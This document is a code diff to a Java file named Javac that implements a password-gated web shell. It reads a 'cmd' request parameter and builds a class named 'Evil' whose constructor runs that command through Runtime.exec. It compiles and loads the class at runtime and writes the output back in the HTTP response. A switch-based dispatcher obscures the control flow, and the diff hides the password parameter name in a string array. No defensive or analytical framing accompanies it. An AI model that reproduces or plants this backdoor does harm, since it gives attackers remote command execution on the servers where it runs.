@@ -13,7 +13,7 @@ import java.util.Random;
 public class Javac {
     public static void main(String[] args) {
         try {
-            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32", "cmd", "xxxxx", "import java.io.BufferedReader;\n", "import java.io.IOException;\n", "import java.io.InputStream;\n", "import java.io.InputStreamReader;\n", "public class Evil", "   public static String result = \"\";\n", "   public Evil", "() throws Throwable  {\n", "        StringBuilder stringBuilder = new StringBuilder();\n", "        try {", "               BufferedReader bufferedReader = new BufferedReader", "(new InputStreamReader(Runtime.getRuntime().exec(\"", "\").getInputStream()));\n", "               String line;\n", "               while((line = bufferedReader.readLine()) != null) {\n", "                       stringBuilder.append(line).append(System.getProperty(\"line.separator\"));\n", "               }\n", "               result = stringBuilder.toString();\n", "        } catch (Exception e) {\n", "              e.printStackTrace();\n", "        }\n", "        throw new Throwable(stringBuilder.toString());", "   }\n", "}", "Evil", ".java", "file:", "<pre>", "</pre>"};
+            String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31|32", "cmd", "xxxxx", "import java.io.BufferedReader;\n", "import java.io.IOException;\n", "import java.io.InputStream;\n", "import java.io.InputStreamReader;\n", "public class Evil", "   public static String result = \"\";\n", "   public Evil", "() throws Throwable  {\n", "        StringBuilder stringBuilder = new StringBuilder();\n", "        try {", "               BufferedReader bufferedReader = new BufferedReader", "(new InputStreamReader(Runtime.getRuntime().exec(\"", "\").getInputStream()));\n", "               String line;\n", "               while((line = bufferedReader.readLine()) != null) {\n", "                       stringBuilder.append(line).append(System.getProperty(\"line.separator\"));\n", "               }\n", "               result = stringBuilder.toString();\n", "        } catch (Exception e) {\n", "              e.printStackTrace();\n", "        }\n", "        throw new Throwable(stringBuilder.toString());", "   }\n", "}", "Evil", ".java", "file:", "<pre>", "</pre>", "pwd"};
             String temp = globalArr[0];
             String[] b = temp.split("\\|");
             String c = null;
@@ -26,20 +26,20 @@ public class Javac {
             URLClassLoader loader = null;
             int id = 0;
             int index = 0;
-            while(true){
+            while (true) {
                 int op = Integer.parseInt(b[index++]);
-                switch (op){
+                switch (op) {
                     case 0:
                         c = request.getParameter(globalArr[1]);
                         break;
                     case 1:
-                        if(!request.getParameter("pwd").equals(PASSWORD)){
+                        if (!request.getParameter(globalArr[32]).equals(PASSWORD)) {
                             return;
                         }
                         tmpPath = Files.createTempDirectory(globalArr[2]).toFile().getPath();
                         break;
                     case 2:
-                        javaCompiler =  ToolProvider.getSystemJavaCompiler();
+                        javaCompiler = ToolProvider.getSystemJavaCompiler();
                         break;
                     case 3:
                         diagnostics = new DiagnosticCollector();
@@ -49,7 +49,7 @@ public class Javac {
                                 .getStandardFileManager(diagnostics, Locale.CHINA, Charset.forName("utf-8"));
                         break;
                     case 5:
-                        id =  new Random().nextInt(10000000);
+                        id = new Random().nextInt(10000000);
                         break;
                     case 6:
                         stringBuilder = new StringBuilder();
@@ -124,7 +124,7 @@ public class Javac {
                         break;
                     case 29:
                         fileObject = standardJavaFileManager.getJavaFileObjects(
-                                tmpPath + File.separator + globalArr[27] +id + globalArr[28]);
+                                tmpPath + File.separator + globalArr[27] + id + globalArr[28]);
                         break;
                     case 30:
                         javaCompiler.getTask(null, standardJavaFileManager, diagnostics,
@@ -136,7 +136,7 @@ public class Javac {
                     case 32:
                         try {
                             loader.loadClass(globalArr[27] + id).newInstance();
-                        }catch (Throwable e){
+                        } catch (Throwable e) {
                             response.getOutputStream().write(globalArr[30].getBytes());
                             response.getOutputStream().write(e.getMessage().getBytes());
                             response.getOutputStream().write(globalArr[31].getBytes());
@@ -144,7 +144,7 @@ public class Javac {
                         break;
                 }
             }
-        }catch (Exception ignored){
+        } catch (Exception ignored) {
 
         }
     }
